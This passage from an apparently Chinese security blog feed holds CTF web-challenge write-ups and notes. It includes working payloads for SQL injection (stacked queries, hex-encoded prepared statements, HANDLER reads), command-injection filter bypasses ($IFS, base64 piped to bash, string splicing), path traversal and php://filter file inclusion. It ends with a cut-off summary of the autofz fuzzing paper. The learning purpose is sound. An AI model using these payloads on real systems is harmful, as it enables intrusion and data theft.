class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">a=c;b=at;c=<span class="hljs-built_in">fl</span>;d=ag;e=.txt;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><span class="hljs-variable">$e</span>;<br></code></pre></td></tr></table></figure><p><strong>base64</strong></p><p>反引号：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;base64转码的命令&quot;</span> | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>传递给bash：（有时候bash会被过滤掉）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;base64转码的命令&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>单引号，双引号</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">c<span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">at</span> fl&#x27;<span class="hljs-symbol">&#x27;ag.tx</span><span class="hljs-string">&quot;&quot;</span>t<br></code></pre></td></tr></table></figure><p>反斜杠</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">c\at fl\a\g.tx\t<br></code></pre></td></tr></table></figure><p>通配符</p><p>&#x2F;???会去寻找 &#x2F; 目录下的三个字符长度的文件，正常情况下会寻找到&#x2F;bin，然后&#x2F;?[a][t]会优先匹配到&#x2F;bin&#x2F;cat,就成功调用了cat命令，然后后面可以使用正常的通配符匹配所需读的文件，如flag.txt文件名长度为8，使用8个?’’，此命令就会读取所有长度为8的文件。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><p><strong>使用&gt;&gt;</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd1&quot;</span> &gt; r;<br><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd2&quot;</span> &gt;&gt; r;<br><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;cmd3&quot;</span> &gt;&gt; r;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cmd4&quot;</span> &gt;&gt; r;<br><span class="hljs-comment">#使用cat r|bash执行</span><br></code></pre></td></tr></table></figure><p><strong>使用换行执行</strong></p><p>创建一个文件a</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ca<span class="hljs-string">\</span><br>t flag.t<span class="hljs-string">\</span><br>xt<br></code></pre></td></tr></table></figure><p>使用sh a即可执行命令cat flag.txt</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebWriteUp1</title>
    <link href="/2024/01/24/WebWriteUp/"/>
    <url>/2024/01/24/WebWriteUp/</url>
    
    <content type="html"><![CDATA[<h4 id="极客大挑战-EasySQL"><a href="#极客大挑战-EasySQL" class="headerlink" title="[极客大挑战]EasySQL"></a>[极客大挑战]EasySQL</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124190853709.png" alt="image-20240124190853709"></p><p>先输入用户名1和密码1</p><p><img src="/2024/01/24/WebWriteUp/image-20240124190942891.png" alt="image-20240124190942891"></p><p>可以看出是通过GET方法传输数据</p><p>尝试输入1’进行测试</p><p>得到报错：<img src="/2024/01/24/WebWriteUp/image-20240124193114395.png" alt="image-20240124193114395"></p><p>这说明是查询语句中是存在一个单引号的，为单引号闭合，那么则构造payload</p><p><code>1&#39;or 1=1 #</code></p><p>填在用户名处（或直接修改），密码任意，因为被#注释掉了</p><p><img src="/2024/01/24/WebWriteUp/image-20240124193458266.png" alt="image-20240124193458266"></p><p>成功绕过</p><h4 id="HaveFun"><a href="#HaveFun" class="headerlink" title="HaveFun"></a>HaveFun</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124195701183.png" alt="image-20240124195701183"></p><p>进来发现啥也没有，那么查看源码</p><p><img src="/2024/01/24/WebWriteUp/image-20240124195736363.png" alt="image-20240124195736363"></p><p>通过Get方法获得参数，并存放在cat中，判断该值是否等于dog，那么构造payload</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200024766.png" alt="image-20240124200024766"></p><p>获得flag</p><h4 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h4><p><img src="/2024/01/24/WebWriteUp/image-20240124200118945.png" alt="image-20240124200118945"></p><p>进来就是这个抽象笑脸，啥也没有，题目里有tag：php，代码审计，那么查看源码</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200330278.png" alt="image-20240124200330278"></p><p>查看source.php（直接改url）</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200411693.png" alt="image-20240124200411693"></p><p>看到还有个hint.php，也打开看一下</p><p><img src="/2024/01/24/WebWriteUp/image-20240124200528267.png" alt="image-20240124200528267"></p><p>只有这么一句话</p><p>还是重点看source.php</p><p>这段代码就是，对用户请求的文件进行安全检查，如果通过安全检查，且在白名单中，则通过include方法包含这个文件，且能得到以下条件：</p><ol><li>设置了一个白名单，只包含source.php和hint.php，第一个if检查是否存在$page并且是否为字符串。</li><li>检查$page是否在白名单中，是的话返回true。接下来，两个函数一个<a href="https://www.php.net/manual/zh/function.mb-substr.php">mb_substr</a>和<a href="https://www.php.net/manual/zh/function.mb-strpos.php">mb_strpos</a>，总的意思就是截取变量page中?前面的字符串，然后再进行白名单校验。</li><li>在url解码后的$page的?前面是否在whitelist里面</li></ol><p>所以构造payload</p><p><code>source.php?file=hint.php?ffffllllaaaagggg</code></p><p>发现，图片消失了，那么说明payload是正确的，那么进行目录穿越找文件</p><p>修改payload（实际五层时就能找到）</p><p><code>source.php?file=hint.php?../../../../../../ffffllllaaaagggg</code></p><p><img src="/2024/01/24/WebWriteUp/image-20240124202309328.png" alt="image-20240124202309328"></p><p>得到flag</p><h4 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h4><p>根据题目猜测是文件包含漏洞</p><p>文件包含漏洞成因：</p><p>为了灵活的包含文件，将被包含文件设置为变量，通过动态变量引入需要包含的文件时，用户对变量的可控而服务器端未对变量值合理的校验或被绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">include() <span class="hljs-comment">// 找不到被包含文件时产生警告，脚本继续执行</span><br><br>include_once() <span class="hljs-comment">// 与include类似，但如果该文件的代码已经被包含，则不会再次包含</span><br><br>require() <span class="hljs-comment">// 找不到被包含文件时产生错误，脚本停止</span><br><br>require_once() <span class="hljs-comment">// 与require类似，但如果该文件的代码已经被包含，则不会再次包含</span><br></code></pre></td></tr></table></figure><p>文件包含漏洞利用：</p><p>windows常见敏感信息</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185135302.png" alt="image-20240125185135302"></p><p>linux常见敏感信息</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185152901.png" alt="image-20240125185152901"></p><p>伪协议</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185254233.png" alt="image-20240125185254233"></p><p>首先先尝试暴力找几层，看看是否存在flag.php之类的文件，发现没有</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185430312.png" alt="image-20240125185430312"></p><p><img src="/2024/01/24/WebWriteUp/image-20240125185446011.png" alt="image-20240125185446011"></p><p>啥也没有，尝试用php伪协议看一眼flag.php的源码</p><p>payload如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>得到一串base64加密的字符串</p><p><img src="/2024/01/24/WebWriteUp/image-20240125185625571.png" alt="image-20240125185625571"></p><p>解码得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find out the flag?&quot;</span>;<br><span class="hljs-comment">//flag&#123;9a011d4ae-cab3-4cc3-90c5-297288f0189b&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Eexc"><a href="#Eexc" class="headerlink" title="Eexc"></a>Eexc</h4><p>这是一道命令注入题</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195121169.png" alt="image-20240125195121169"></p><p>随便输了个1，发现居然能ping通</p><p>那么修改payload为：1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195228705.png" alt="image-20240125195228705"></p><p>继续查看上级目录：1;ls ..&#x2F;</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195404097.png" alt="image-20240125195404097"></p><p>再查看上一级</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195436474.png" alt="image-20240125195436474"></p><p>找到flag，用cat命令查看</p><p><img src="/2024/01/24/WebWriteUp/image-20240125195526719.png" alt="image-20240125195526719"></p><h4 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126150517909.png" alt="image-20240126150517909"></p><p>进来发现只有个这个，那推测跟上一题类似，也是一道命令注入题</p><p>构造payload：</p><p>&#x2F;?ip&#x3D;127.0.0.1</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150625427.png" alt="image-20240126150625427"></p><p>能ping通</p><p>那么还是一样的套路，修改payload为：&#x2F;?ip&#x3D;127.0.0.1;ls</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150732541.png" alt="image-20240126150732541"></p><p>利用cat命令查看</p><p><img src="/2024/01/24/WebWriteUp/image-20240126150755178.png" alt="image-20240126150755178"></p><p>应该是过滤了空格</p><blockquote><p>过滤空格的方法有：</p><p>$IFS</p><p>${IFS}</p><p>$IFS$(任意数字)， 如：$IFS$1</p><p>&lt;</p><p>&lt;&gt;</p><p>{cat, flag.php}</p><p>%20</p><p>%09</p></blockquote><p>尝试payload: &#x2F;?ip&#x3D;127.0.0.1;cat$IFSflag.php</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151216802.png" alt="image-20240126151216802"></p><p>那应该是有更多的过滤手段，再看看index.php中有啥</p><p><img src="/2024/01/24/WebWriteUp/image-20240126151540171.png" alt="image-20240126151540171"></p><p>这段代码的作用：</p><ol><li>检查变量 <code>$ip</code> 中是否包含一些特殊字符。如果 <code>$ip</code> 中包含其中任何一个字符，代码将输出匹配的字符数（由 参数 <code>$match</code> 传递），然后输出 “fxck your symbol!” 并结束程序。</li><li>检查是否有空格在变量 <code>$ip</code> 中。如果有空格，输出 “fxck your space!” 并结束程序。</li><li>检查 <code>$ip</code> 中是否包含字符串 “bash”。如果包含，输出 “fxck your bash!” 并结束程序。</li><li>检查 <code>$ip</code> 中是否包含字符串 “flag”，如果包含，输出 “fxck your flag!” 并结束程序</li><li>如果通过了所有的检查，使用 <code>shell_exec</code> 函数执行 ping 命令。这里是执行 <code>ping -c 4</code> 命令，其中 <code>-c 4</code> 表示发送四个 ICMP 包。</li></ol><p>那么显然，可以尝试拼接的方式被限制的关键词flag</p><p>构造payload：&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;ag;cat$IFS$1fl$a.php，得到flag</p><p><img src="/2024/01/24/WebWriteUp/image-20240126153519187.png" alt="image-20240126153519187"></p><h4 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h4><p><img src="/2024/01/24/WebWriteUp/image-20240126154133769.png" alt="image-20240126154133769"></p><p>Submit一下</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154325513.png" alt="image-20240126154325513"></p><p>尝试sql注入</p><p><strong>首先判断是字符型还是数字型</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154658007.png" alt="image-20240126154658007"></p><p><img src="/2024/01/24/WebWriteUp/image-20240126154634784.png" alt="image-20240126154634784"></p><p>两次都有回显，说明是字符型注入</p><p>接着<strong>查询字段数</strong>：</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154809129.png" alt="image-20240126154809129"></p><p>查到第三次发现：</p><p><img src="/2024/01/24/WebWriteUp/image-20240126154847897.png" alt="image-20240126154847897"></p><p>说明有两个字段</p><p><strong>确定字段的显示顺序</strong></p><p><img src="/2024/01/24/WebWriteUp/image-20240126155713350.png" alt="image-20240126155713350"></p><p>说明select被过滤掉了</p><p>（这里不会了，看题解，说是要用堆叠注入，堆叠注入相关笔记单独整理）</p><p>爆破数据库</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193749558.png" alt="image-20240126193749558"></p><p>尝试爆表</p><p><img src="/2024/01/24/WebWriteUp/image-20240126193856592.png" alt="image-20240126193856592"></p><p>构造payload查看第一个表1919810931114514</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>这里要注意，表名为数字时，要用反引号括起来，同时需要在最后加#屏蔽掉其他查询语句</p><p><img src="/2024/01/24/WebWriteUp/image-20240126195918958.png" alt="image-20240126195918958"></p><p><strong>方法一</strong></p><p>因为select被过滤掉了，那么则可以对 </p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>进行16进制编码，然后构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;<span class="hljs-keyword">SeT</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="hljs-keyword">prepare</span> execsql <span class="hljs-keyword">from</span> <span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span> execsql;#<br></code></pre></td></tr></table></figure><ul><li>prepare…from…是预处理语句，会进行编码转换。</li><li>execute用来执行由SQLPrepare创建的SQL语句。</li><li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</li></ul><p><img src="/2024/01/24/WebWriteUp/image-20240126205028096.png" alt="image-20240126205028096"></p><p><strong>方法二</strong></p><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/24/WebWriteUp/image-20240126211244718.png" alt="image-20240126211244718"></p><p>在MySQL中，<code>HANDLER</code>语句用于通过存储引擎直接操作表的数据，而不是使用标准的SQL查询语句。可以以更底层的方式对表进行读写操作，绕过SQL解释器。</p><h4 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h4><p><img src="/2024/01/24/WebWriteUp/image-20240127142115912.png" alt="image-20240127142115912"></p><p>输入1’，没有回显，输入1，正常回显，判断是数字型注入</p><p>输入1; show tables# 爆表看看</p><p><img src="/2024/01/24/WebWriteUp/image-20240127143407328.png" alt="image-20240127143407328"></p><p>尝试：1; select * from Flag#</p><p>回显错误</p><p>尝试：1; show columns from Flag#</p><p>回显错误</p><p><img src="/2024/01/24/WebWriteUp/image-20240127143719209.png" alt="image-20240127143719209"></p><p>看着应该是过滤了很多关键字</p><p>尝试上边提到过的将语句转16进制，构造payload</p><p>1;SeT@a&#x3D;0x73656c6563742a66726f6d466c6167;prepare execsql from @a;execute execsql;#</p><p>回显错误</p><p>那么再尝试handler语句</p><p>1; handler Flag open as a; handler a read next;#</p><p>回显依然是错误</p><p>（做不动了，看题解）</p><p>猜测不仅是很多关键词被过滤了，flag本身也被过滤了</p><p>大佬们猜测后段语言为：select $_GET[‘query’] || flag from Flag</p><p>这里猜测的思路，以我的理解如下：</p><p>首先在知道的数字型注入之后，经过上述看题解之前的尝试之后，发现常规的注入手段不好使</p><p>然后猜想是不是在后端用的语言里，获取了输入框的内容还进行的别的运算</p><p>那么在输入框尝试：1，1，得到回显：</p><p><img src="/2024/01/24/WebWriteUp/image-20240127194441306.png" alt="image-20240127194441306"></p><p>尝试1，2</p><p>发现回显并没有变</p><p>尝试1，a</p><p>发现得不到回显</p><p>这里需要补充一个知识：</p><blockquote><p>当在sql语句中使用了||运算符时，如果两端其中一个字段的值为NULL或者非数字字符串，那么连接的操作的结果为0</p></blockquote><p>那么就可以猜测，在后端的语句里使用了||运算符</p><p>这里就有了第一种解法：</p><p>将||运算符转换，原理如下：</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195449355.png" alt="image-20240127195449355"></p><p>所以构造payload：1; set sql_mode&#x3D;PIPES_AS_CONCAT; select 1</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195652258.png" alt="image-20240127195652258"></p><p>解法2</p><p>构造payload：*,1</p><p>传到后端的语句就变成了：select *,1 || flag from Flag</p><p>这段SQL代码的含义是：从Flag表中选择所有的列，以及由列flag的值与数字1进行连接生成的新列。原理如下：</p><p><img src="/2024/01/24/WebWriteUp/image-20240127195734295.png" alt="image-20240127195734295"></p><h4 id="极客大挑战-Secret-File"><a href="#极客大挑战-Secret-File" class="headerlink" title="[极客大挑战 ]Secret File"></a>[极客大挑战 ]Secret File</h4><p>看题目名字，猜测是个文件包含类似的题</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200322958.png" alt="image-20240127200322958"></p><p>进去长这样，查看源码</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200350391.png" alt="image-20240127200350391"></p><p>发现还有个元素，只是把字体设置成了黑色，找到元素位置点进去（或者直接在url里&#x2F;Archive_room.php）</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200438038.png" alt="image-20240127200438038"></p><p>再点</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200507688.png" alt="image-20240127200507688"></p><p>回到上一页，查看源码：</p><p><img src="/2024/01/24/WebWriteUp/image-20240127200821860.png" alt="image-20240127200821860"></p><p>发现有个action.php，但最后进去的是end.php，说明存在重定向，抓个包，然后重新发到action.php</p><p><img src="/2024/01/24/WebWriteUp/image-20240127201839681.png" alt="image-20240127201839681"></p><p>看到有个secr3t.php，查看</p><p><img src="/2024/01/24/WebWriteUp/image-20240127202000095.png" alt="image-20240127202000095"></p><p>显然这里进行了过滤，如果用户输入的文件名包含 <code>../</code>、<code>tp</code>、<code>input</code> 或 <code>data</code> 中的任何一个子串，则输出 “Oh no!” 并终止脚本执行，那么这里可以尝试伪协议，构造payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>得到flag.php的内容：</p><p><img src="/2024/01/24/WebWriteUp/image-20240127202726155.png" alt="image-20240127202726155"></p><p>base64解码即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>autofz</title>
    <link href="/2024/01/24/autofz/"/>
    <url>/2024/01/24/autofz/</url>
    
    <content type="html"><![CDATA[<h2 id="autofz-Automated-Fuzzer-Composition-at-Runtime"><a href="#autofz-Automated-Fuzzer-Composition-at-Runtime" class="headerlink" title="autofz: Automated Fuzzer Composition at Runtime"></a>autofz: Automated Fuzzer Composition at Runtime</h2><p>作者：Yu-Fu Fu &#x2F; Jaehyuk Lee &#x2F; Taesoo Kim</p><p>学校或机构：Georgia Institute of Technology（佐治亚理工学院）</p><h4 id="选择负担"><a href="#选择负担" class="headerlink" title="选择负担"></a>选择负担</h4><p><strong>什么是选择负担</strong></p><p>模糊测试由于开发多样化的模糊测试工具而变得越来越受欢迎，特别是在软件漏洞检测方面。由于各种模糊测试技术的应用，大多数模糊测试工具在其选择的目标上表现出色。然而，模糊测试工具的多样性也使得难以选择最适合复杂实际程序的模糊测试工具，称之为<strong>选择负担</strong>。社区尝试通过创建一组标准基准来解决这个问题，以比较和对比模糊测试工具在各种应用程序上的性能，但结果总是一个次优的决策——平均性能最佳的模糊测试工具并不保证对用户关注的目标产生最佳结果。</p><p><strong>当前解决策略</strong></p><ul><li>模糊测试基准Fuzzing benchmarks（如Magma，Lava，ProFuzzBench）列举了每个基准目标的适用的模糊测试工具。</li><li>协作模糊测试，通过合作使用不同组合的模糊测试工具，通过多个模糊测试器的语料库共享提升整体性能。但在模糊测试器的选择依赖于静态分析的结果，依然需要大量的计算和人力资源，同时，如何为多个模糊测试器分配合理的资源也会影响整体的效果</li></ul><p><strong>autofz解决思路</strong></p><blockquote><p>Unlike previous works, autofz automatically deploys a set of fuzzer(s) per workload, not per program.</p></blockquote><p>不像其他fuzzer，autofz并不是为整个程序，而是为每个工作负载部署一套模糊测试工具，autofz 的目标是通过对模糊测试工具的动态组合实现选择问题的完全自动化，成为一种一键解决方案。</p><h4 id="autofz"><a href="#autofz" class="headerlink" title="autofz"></a>autofz</h4><p><strong>trend（趋势）</strong></p><p>将基准模糊测试工具的运行时进展称为趋势，autofz在整个执行过程中会随着趋势的变化而切换模糊测试工具并调整资源，而不是在执行期间坚持使用一组特定的模糊测试工具。</p><p><strong>工作原理</strong></p><p>准备阶段：</p><p>捕获目标二进制文件的运行时趋势，并部署展示强趋势的模糊测试工具</p><p>聚焦阶段：</p><p>基于捕获的趋势和指导信息，聚焦阶段尝试通过选定的模糊测试工具实现最佳性能。此外，autofz 利用指导信息的动态资源调整使其能够兼顾个体模糊测试工具和不同模糊测试工具组合的优势。一方面，它可以优先考虑某个模糊测试工具，通过将所有资源分配给选定的模糊测试工具，显著优于其他工具。另一方面，autofz 通过分配资源充分利用多个模糊测试工具。</p><p><img src="/2024/01/24/autofz/image-20240125102248335.png" alt="image-20240125102248335"></p><ol><li>为了公平进行模糊测试效果的比较，在第一步先进行种子的同步，同时为所有基准模糊测试工具分配相同数量的资源（1）</li><li>然后每个模糊测试器轮流以非常短的时间间隔运行，直到达到退出条件（退出条件将在后边详细说明）然后通过AFL Bitmap衡量每个模糊测试器的运行效果。（2，3）</li><li>根据趋势，决定每个模糊测试工具在当前工作负载下的优先级以及资源分配元数据（4）</li><li>对分配的CPU核心进行时间切片（作用还没想明白）（5）</li><li>过渡到聚焦阶段的时候在进行种子同步（6，7），允许被选择的模糊测试器共享准备阶段可能产生的独特测试用例</li><li>进入聚焦阶段，按照资源分配元数据一次运行所选的模糊测试工具，为每个工具分配特定的CPU时间窗口（8）</li><li>此时聚焦阶段目的是实现最大性能，所以会在一个在一个模糊测试工具执行后，我们同步种子，以允许剩余的模糊测试工具通过其他模糊测试工具探索未发现的路径。当分配的全部资源被消耗完毕时，它回到准备阶段并测量趋势（9）</li><li>两个阶段轮流执行，知道模糊测试执行终止</li></ol><h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a><strong>难点</strong></h4><p><strong>准备时间</strong></p><p>准备阶段的时间选择至关重要，如果准备阶段的时间过短，很难捕获到模糊测试工具的明显趋势，导致最后选取的工具集并不是最优的；但准备时间过长，则有可能造成资源的浪费，同时使整个实验的周期延长。为了避免引入另一种手动确定适当时间预算的方法，autofz引入了动态准备时间。</p><p>为了实现这一点，autofz首先在运行时计算位图的峰值差异，当差异大于定义的阈值时，可以允许准备阶段提前退出，然后直接进入聚焦阶段，多余的资源同样也被委托给聚焦阶段。阈值可以由用户进行初始配置（θinit）。然而，autofz会自动调整初始配置并找到每个目标的最佳阈值，从而消除了另一种手动努力。阈值会在每个准备阶段之后的每一轮进行校准。具体而言，如果发生提前退出，autofz将通过θinit增加阈值（θcur）。否则，它将θcur除以二。这种设计背后的原理是随着模糊测试活动的进行，总体上其进展逐渐减缓。在其早期阶段，由于以合法种子作为其初始输入，所选的模糊测试工具通常会产生相当大的进展。因此，如果阈值过小，它将很容易被越过，autofz可能会做出次优的决策。相反，随着模糊测试活动的进行，每个模糊测试工具产生的进展很容易饱和，探索新路径变得困难。</p><p><strong>如何衡量趋势</strong></p><p>由于进行了种子的同步，所以，可以将运行时，每个模糊测试工具能探索的独特的路径视作其贡献，即找到所有工具的共同路径，然后把这些路径从位图中减掉，比较贡献大小</p><p><strong>资源分配</strong></p><p>autofz支持两种资源分配策略</p><ol><li>优先考虑最佳性能，将所有资源分配给排名最高的模糊测试工具。仅当某个模糊测试工具明显优于所有其他基准模糊测试工具时，才激活此策略</li><li>根据每个模糊测试工具的趋势进行比例分配资源。请注意，每个基准模糊测试工具的贡献是基于它发现的唯一路径进行评估的。因此，如果在准备阶段捕获到多个强烈趋势，这很大程度上表明准备阶段找到了多个有利于模糊测试程序不同部分的模糊测试工具。在这种情况下，我们根据它们的贡献比例分配资源，并实现协作模糊测试的好处。</li></ol><h4 id="实验实施"><a href="#实验实施" class="headerlink" title="实验实施"></a><strong>实验实施</strong></h4><p><strong>实验环境</strong></p><p>在配备 AMD Ryzen 9 3900 的 Ubuntu 20.04 上进行实验，内存为 24 个，内存为 32 GB。为了将autofz与CUPID和ENFUZZ进行比较，将多个CPU内核分配给Docker容器。将 autofz 与单个 fuzzer 进行比较的其他评估是使用容器执行的，容器分配一个 CPU 内核，而不会限制内存。由于兼容性，所有容器运行 Ubuntu 16.042。</p><p><strong>基准模糊器选择</strong></p><p>autofz 使用了所有支持 Fuzzer Test Suite 和 UNIFUZZ 的模糊测试器，同时支持CUPID和ENFUZZ中采用的所有模糊测试器进行公平比较</p><blockquote><p><strong>Fuzzer Test Suite（FTS）</strong>：</p><p>Fuzzer Test Suite 包括一系列标准化的测试用例和目标程序，用于模糊测试工具的性能评估。这些测试用例可能涉及不同类型的二进制文件和应用程序，旨在覆盖多个应用场景。FTS 的目标是提供一个一致的基准，以便研究人员和开发人员能够有效地评估不同模糊测试工具的表现。</p><p><strong>UNIFUZZ</strong>：</p><p>UNIFUZZ 是一个开源的、集成化的模糊测试解决方案，专注于提供可扩展和易用的模糊测试环境。它为研究人员和开发人员提供了一整套工具，包括各种先进的模糊测试工具、资源管理、结果分析等功能。</p><p><strong>CUPID：</strong></p><p>CUPID 是一个协同模糊测试平台，旨在通过协同不同类型的模糊器以提高模糊测试活动的性能。它通过种子同步等方法，协同运行多个模糊器，以期获得更好的代码覆盖率和更高的漏洞发现率。</p><p><strong>ENFUZZ：</strong></p><p>ENFUZZ 是一个演化神经模糊系统，专注于无监督区域完成。它结合了演化算法和神经模糊系统的思想，通过进化的方式改进模糊测试过程，提高模糊测试的效率和效果。</p></blockquote><p><strong>目标二进制文件和种子</strong></p><p>将autofz集成到了UNIFUZZ和FTS中，使用真实的程序评估autofz</p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/2024/01/24/autofz/image-20240126215138099.png" alt="image-20240126215138099"></p><p>横坐标是运行时间，纵坐标是位图覆盖率</p><p>可以看出，autofz的效果基本都优于单个模糊测试器，且随着运行时间推移，效果会越来越好。只在pdftotext这里输给了RedQueen</p><p><img src="/2024/01/24/autofz/image-20240126220213062.png" alt="image-20240126220213062"></p><p>本文引入了CD图（）UNIFUZZ 中目标的关键差异。每个数字表示模糊器的平均排名。每个粗体线表示根据 按该行分组的模糊器之间的性能差异没有统计学意义。这里可以看出，平均而言，UNIFUZZ 和 FTS 中的 autofz 排名分别为 1.22 和 1.2，性能优于别的单个模糊器</p><p><img src="/2024/01/24/autofz/image-20240126222155028.png" alt="image-20240126222155028"></p><p>与别的模糊器协作方法比较，横坐标是CPU时间</p><p>autofz-6 &#x3D; [AFL, FairFuzz, QSYM, AFLFast, LAF-INTEL, Radamsa]</p><p>CUPID-4 and ENFUZZ-Q &#x3D; [AFL, FairFuzz, QSYM, AFLFast]</p><p>autofz-10 &#x3D; [All baseline fuzzers described in except 